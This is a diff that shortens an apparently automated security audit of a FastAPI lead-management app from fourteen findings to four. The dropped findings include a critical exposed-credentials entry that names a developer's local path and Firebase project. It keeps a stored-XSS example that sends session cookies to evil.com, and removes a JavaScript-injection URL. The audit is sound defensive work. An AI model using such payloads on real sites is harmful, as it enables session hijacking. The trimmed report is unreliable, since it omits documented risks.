@@ -9,11 +9,9 @@ Reviewer: Independent Security Auditor (Automated)
 
 SUMMARY
 -------
-Total vulnerabilities found: 14
-  Critical: 2
-  High:     4
-  Medium:   5
-  Low:      3
+Total vulnerabilities found: 4
+  Critical: 1
+  High:     3
 
 ================================================================================
 DETAILED FINDINGS
@@ -27,335 +25,63 @@ Line: 13
 Description:
   The JWT secret key has a hardcoded default value:
     secret_key: str = os.getenv("SECRET_KEY", "troque-esta-chave-em-producao")
-  If the SECRET_KEY environment variable is not set (which is the default when
-  running the application without explicit configuration), the application uses
-  the predictable string "troque-esta-chave-em-producao" to sign and verify all
+  If the SECRET_KEY environment variable is not set, the application uses the
+  predictable string "troque-esta-chave-em-producao" to sign and verify all
   JWT tokens.
 Exploitation:
   An attacker who knows or guesses this default secret key can forge arbitrary
-  JWT tokens, impersonate any user, and gain full access to the application.
-  Since this default value is embedded in the source code (and likely in any
-  public repository), any deployment that neglects to set the environment
-  variable is fully compromised. The attacker can craft a token with any
-  user ID in the "sub" claim and bypass all authentication.
+  JWT tokens, impersonate any user, and gain full access to the application by
+  crafting a token with any user ID in the "sub" claim.
 
 --- VULNERABILITY #2 -----------------------------------------------------------
-CWE-798: Hard-Coded Credential / Sensitive File Path Exposure
-Severity: Critical
-File: app/config.py
-Lines: 16-19
-Description:
-  The Firebase service account credentials path is hardcoded to a specific
-  absolute path on the developer's machine:
-    firebase_credentials_path: str = os.getenv(
-        "FIREBASE_CREDENTIALS_PATH",
-        r"C:\Users\tonil\Desktop\tcc\lead-manager-54595-firebase-adminsdk-fbsvc-375221693a.json",
-    )
-  This exposes (a) the developer's username and directory structure, (b) the
-  Firebase project ID ("lead-manager-54595"), and (c) the service account key
-  file identifier ("375221693a"). If the source code is shared or committed to
-  a repository, this information becomes public.
-Exploitation:
-  The exposed Firebase project ID and service account key file name could help
-  an attacker target the specific Firebase project. If the credentials JSON
-  file itself is also committed to the repository (which the filename in the
-  path suggests), the attacker gains full administrative access to the
-  Firebase backend, including all Firestore data.
-
---- VULNERABILITY #3 -----------------------------------------------------------
 CWE-614: Sensitive Cookie Without 'Secure' Flag
 Severity: High
 File: app/routers/api_auth.py
 Lines: 39-47 and 65-73
 Description:
   The JWT access token cookie is set with secure=False in both the register
-  and login endpoints:
-    response.set_cookie(
-        key="access_token",
-        value=auth_payload["access_token"],
-        httponly=True,
-        secure=False,       # <--- INSECURE
-        samesite="lax",
-        max_age=60 * 60 * 8,
-        path="/",
-    )
-  This means the authentication cookie will be transmitted over unencrypted
-  HTTP connections.
+  and login endpoints (httponly=True, secure=False, samesite="lax"). This
+  means the authentication cookie will be transmitted over unencrypted HTTP
+  connections.
 Exploitation:
   An attacker performing a man-in-the-middle attack (e.g., on a public Wi-Fi
   network) can intercept the cookie in transit over HTTP and hijack the user's
-  session. The httponly flag protects against XSS-based cookie theft, but
-  without the secure flag the cookie is exposed to network-level interception.
+  session.
 
---- VULNERABILITY #4 -----------------------------------------------------------
+--- VULNERABILITY #3 -----------------------------------------------------------
 CWE-352: Cross-Site Request Forgery (CSRF)
 Severity: High
 File: app/routers/api_auth.py, app/routers/api_leads.py
 Lines: Multiple (all state-changing endpoints)
 Description:
-  The application uses cookie-based JWT authentication (access_token cookie)
-  but does not implement any CSRF protection mechanism. There are no CSRF
-  tokens, no custom header requirements for cookie-authenticated requests, and
-  no SameSite=Strict policy (SameSite=Lax provides only partial protection).
-  State-changing operations (POST, PUT, DELETE) on leads, interactions,
-  registration, and login are all vulnerable.
+  The application uses cookie-based JWT authentication but does not implement
+  any CSRF protection. There are no CSRF tokens, no custom header requirements
+  for cookie-authenticated requests, and only SameSite=Lax (which provides
+  partial protection). State-changing operations (POST, PUT, DELETE) on leads,
+  interactions, registration, and login are all vulnerable.
 Exploitation:
   An attacker can create a malicious website that causes a logged-in user's
-  browser to send authenticated requests to the API. For example, a hidden
-  form on the attacker's site could POST to /api/leads to create fake leads,
-  or DELETE to /api/leads/{id} to remove existing leads. The SameSite=Lax
-  policy only blocks cross-site requests for some HTTP methods in top-level
-  navigations, but does not fully prevent CSRF attacks via forms.
+  browser to send authenticated requests to the API. A hidden form could POST
+  to /api/leads to create fake leads, or DELETE to /api/leads/{id} to remove
+  existing leads.
 
---- VULNERABILITY #5 -----------------------------------------------------------
-CWE-79: Cross-Site Scripting (XSS) via DOM Manipulation
-Severity: High
-File: app/templates/base.html
-Lines: 31-34
-Description:
-  The base template injects server-side variables directly into a JavaScript
-  object without proper escaping:
-    window.APP_CONFIG = {
-        pageName: "{{ page_name }}",
-        leadId: "{{ lead_id | default('') }}"
-    };
-  In particular, the lead_id variable originates from the URL path parameter
-  in web.py (lines 55 and 64):
-    def lead_detail_page(request: Request, lead_id: str):
-        ...
-        {"lead_id": lead_id}
-  The Jinja2 autoescaping is for HTML context, but these values are injected
-  into a JavaScript string literal context. HTML autoescaping does not prevent
-  JavaScript injection. A carefully crafted lead_id value could break out of
-  the JavaScript string and inject arbitrary code.
-Exploitation:
-  An attacker could craft a URL such as:
-    /leads/";alert(document.cookie);//
-  While Jinja2's HTML autoescaping would encode the double-quote as &quot;
-  in an HTML context, the behavior inside a <script> block depends on the
-  template engine configuration. If autoescaping is not active for JS contexts
-  (which is the standard Jinja2 behavior), the attacker can inject arbitrary
-  JavaScript. Even with HTML escaping, certain bypass techniques may work
-  depending on the browser's interpretation of encoded characters within
-  <script> tags.
-
---- VULNERABILITY #6 -----------------------------------------------------------
+--- VULNERABILITY #4 -----------------------------------------------------------
 CWE-79: Stored XSS via Dynamic Content Rendering
 Severity: High
 File: app/templates/leads.html, app/templates/lead_detail.html, app/templates/dashboard.html
-Lines: leads.html:99, lead_detail.html:25, lead_detail.html:56, dashboard.html:44, dashboard.html:54
+Lines: leads.html:99, lead_detail.html:25, lead_detail.html:56, dashboard.html:44
 Description:
-  Multiple templates contain empty container elements (e.g., <tbody id=
-  "leadsTableBody">, <dl id="leadDetailList">, <div id="interactionsList">)
-  that are populated via JavaScript (app.js) using data from the API. If the
-  JavaScript uses innerHTML or similar DOM manipulation without sanitizing
-  user-supplied data (lead names, company names, interaction notes, etc.),
-  stored XSS is possible. The server-side templates do not perform output
-  encoding for client-rendered content, so the security entirely depends on
-  the client-side JavaScript implementation (app.js was not in scope for this
-  review).
+  Multiple templates contain empty container elements that are populated via
+  JavaScript (app.js) using data from the API. If the JavaScript uses innerHTML
+  or similar DOM manipulation without sanitizing user-supplied data (lead names,
+  company names, interaction notes), stored XSS is possible. The server-side
+  templates do not perform output encoding for client-rendered content.
 Exploitation:
-  An attacker could create a lead with a name like:
-    <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
-  If the JavaScript renders this name using innerHTML, the malicious script
-  executes in the context of any user who views the leads list or detail page.
-  This could steal session cookies, perform actions on behalf of the user, or
-  redirect them to phishing sites.
-
---- VULNERABILITY #7 -----------------------------------------------------------
-CWE-400: Uncontrolled Resource Consumption (Denial of Service)
-Severity: Medium
-File: app/routers/api_leads.py
-Lines: 78-89 (export_leads endpoint)
-Description:
-  The export endpoint fetches up to 50,000 leads at once:
-    result = service.list_leads(
-        owner_id=user["id"],
-        page=1,
-        page_size=50000,
-        ...
-    )
-  This loads all matching leads into memory, serializes them, and converts
-  them to CSV or XLSX format. There is no streaming, no rate limiting, and
-  the hardcoded limit of 50,000 records could consume significant server
-  memory.
-Exploitation:
-  An authenticated attacker (or a user with many leads) could repeatedly call
-  the export endpoint, causing the server to allocate large amounts of memory
-  for each request. Multiple concurrent export requests could exhaust server
-  resources and cause a denial of service for all users.
-
---- VULNERABILITY #8 -----------------------------------------------------------
-CWE-400: Uncontrolled Resource Consumption (File Upload)
-Severity: Medium
-File: app/routers/api_leads.py
-Lines: 96-117 (import_leads endpoint)
-Description:
-  The import endpoint reads the entire uploaded file into memory without any
-  size limit:
-    content = await file.read()
-  There is no maximum file size configured in FastAPI, and no validation of
-  the file size before reading. The content is then parsed with pandas, which
-  can consume additional memory.
-Exploitation:
-  An authenticated attacker could upload an extremely large file (e.g.,
-  several GB) to exhaust server memory and cause a denial of service. The
-  lack of file size limits also means that maliciously crafted files could
-  trigger excessive processing time in pandas.
-
---- VULNERABILITY #9 -----------------------------------------------------------
-CWE-209: Information Exposure Through Error Messages
-Severity: Medium
-File: app/firebase.py
-Lines: 15-18
-Description:
-  When the Firebase credentials file is not found, the error message exposes
-  the full file system path:
-    raise FileNotFoundError(
-        f"Arquivo de credenciais do Firebase nao encontrado em {credentials_path}"
-    )
-  This reveals the server's directory structure and the exact location where
-  credentials are expected.
-Exploitation:
-  If this error is triggered in a production environment and the error message
-  reaches the client (via a 500 error response), an attacker learns internal
-  server paths. This information aids in further attacks such as path traversal
-  or targeted file access attempts.
-
---- VULNERABILITY #10 ----------------------------------------------------------
-CWE-204: Observable Response Discrepancy (User Enumeration)
-Severity: Medium
-File: app/services/firestore_service.py
-Lines: 78-81 (create_user method)
-Description:
-  The user registration endpoint reveals whether an email is already
-  registered:
-    if self.get_user_by_email(normalized_email):
-        raise ValueError("Ja existe um usuario cadastrado com este e-mail.")
-  This message is propagated directly to the client via the HTTP 400 response
-  in api_auth.py line 36.
-Exploitation:
-  An attacker can enumerate valid user email addresses by attempting to
-  register with different emails and observing whether the response indicates
-  the email is already in use. This information can be used for targeted
-  phishing, credential stuffing, or brute-force password attacks.
-
---- VULNERABILITY #11 ----------------------------------------------------------
-CWE-770: Allocation of Resources Without Limits
-Severity: Medium
-File: app/services/firestore_service.py
-Lines: 198-272 (list_leads method)
-Description:
-  The list_leads method loads ALL leads for a given owner from Firestore into
-  memory before applying filters and pagination:
-    documents = [self._serialize_lead(doc.id, doc.to_dict()) for doc in query.stream()]
-  Filtering by status, source, date range, and search is performed in Python
-  after fetching all documents. This is inefficient and does not scale.
-Exploitation:
-  A user with a very large number of leads could cause excessive memory
-  consumption and slow response times on every list/filter/export request.
-  An attacker could deliberately create many leads and then make list requests
-  to degrade server performance.
-
---- VULNERABILITY #12 ----------------------------------------------------------
-CWE-331: Insufficient Entropy / Weak Token Duration
-Severity: Low
-File: app/config.py
-Line: 15
-Description:
-  The default JWT token expiration is 480 minutes (8 hours):
-    access_token_expire_minutes: int = int(os.getenv("ACCESS_TOKEN_EXPIRE_MINUTES", "480"))
-  This is a relatively long session duration. Combined with the lack of a
-  token revocation mechanism (there is no token blacklist or refresh token
-  rotation), a stolen token remains valid for up to 8 hours.
-Exploitation:
-  If a JWT token is stolen (e.g., via XSS, network interception, or log
-  exposure), the attacker can use it for up to 8 hours. There is no way for
-  the legitimate user to invalidate the token. The logout endpoint only
-  deletes the cookie from the browser but does not actually revoke the token.
-
---- VULNERABILITY #13 ----------------------------------------------------------
-CWE-532: Information Exposure Through Log Files / Health Endpoint
-Severity: Low
-File: app/main.py
-Lines: 25-34
-Description:
-  The /health endpoint is unauthenticated and exposes internal collection
-  names:
-    return {
-        "status": "ok",
-        "app": settings.app_name,
-        "collections": {
-            "users": settings.users_collection,
-            "leads": settings.leads_collection,
-        },
-    }
-  This reveals the Firestore collection naming convention (e.g.,
-  "gpt_python_users", "gpt_python_leads"), which exposes internal
-  architecture details.
-Exploitation:
-  An attacker can access /health without authentication and learn the exact
-  Firestore collection names. If the attacker has or obtains access to the
-  Firebase project (see Vulnerability #2), they know exactly which
-  collections to target. The naming convention also reveals the AI model
-  and language used to generate the application.
-
---- VULNERABILITY #14 ----------------------------------------------------------
-CWE-1004: Sensitive Cookie Without 'SameSite' Strict Attribute
-Severity: Low
-File: app/routers/api_auth.py
-Lines: 39-47 and 65-73
-Description:
-  The authentication cookie uses SameSite="lax" instead of "strict". While
-  "lax" provides partial CSRF protection (blocking cross-site POST requests
-  from third-party sites in most browsers), it still allows the cookie to be
-  sent on top-level GET navigations from external sites.
-Exploitation:
-  If any GET endpoint has side effects or reveals sensitive data, a cross-site
-  link could exploit the lax SameSite policy to access those endpoints with
-  the user's credentials. Combined with the lack of CSRF tokens (Vulnerability
-  #4), this creates a broader attack surface.
-
-================================================================================
-ADDITIONAL OBSERVATIONS (NOT COUNTED AS VULNERABILITIES)
-================================================================================
-
-1. NO RATE LIMITING:
-   The application has no rate limiting on any endpoint, including login
-   and registration. This makes it susceptible to brute-force password
-   attacks and credential stuffing.
-
-2. NO INPUT SANITIZATION ON IMPORT:
-   The CSV/Excel import feature (api_leads.py lines 96-117) trusts the
-   content of uploaded files and passes values directly to create_lead.
-   While Pydantic validation exists for the API-created leads, the import
-   path uses raw string conversion and bypasses some validation.
-
-3. MISSING CORS CONFIGURATION:
-   The FastAPI application does not configure CORS middleware. Depending
-   on deployment, this may either be too restrictive (blocking legitimate
-   frontend requests) or too permissive (if a reverse proxy adds
-   permissive CORS headers).
-
-4. NO HTTPS ENFORCEMENT:
-   There is no HTTP-to-HTTPS redirect or HSTS header configuration. The
-   application relies entirely on the deployment environment for transport
-   security.
-
-5. JWT TOKEN IN RESPONSE BODY:
-   The login and register endpoints return the JWT token in the JSON
-   response body (in addition to setting it as a cookie). This means the
-   token may be logged by proxies, stored in browser history, or cached.
-
-6. BROAD EXCEPTION HANDLING:
-   Multiple locations use bare "except Exception" (dependencies.py line 34,
-   firestore_service.py line 413), which suppresses specific error details
-   and may mask security-relevant exceptions.
-
-7. LOGOUT DOES NOT INVALIDATE TOKEN:
-   The logout endpoint (api_auth.py lines 77-81) only deletes the cookie
-   from the browser response. The JWT token itself remains valid until its
-   expiration time. There is no server-side token revocation mechanism.
+  An attacker could create a lead with a name like
+  <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">. If
+  the JavaScript renders this name using innerHTML, the malicious script
+  executes in the context of any user who views the leads list or detail page,
+  stealing session cookies.
 
 ================================================================================
 END OF REPORT
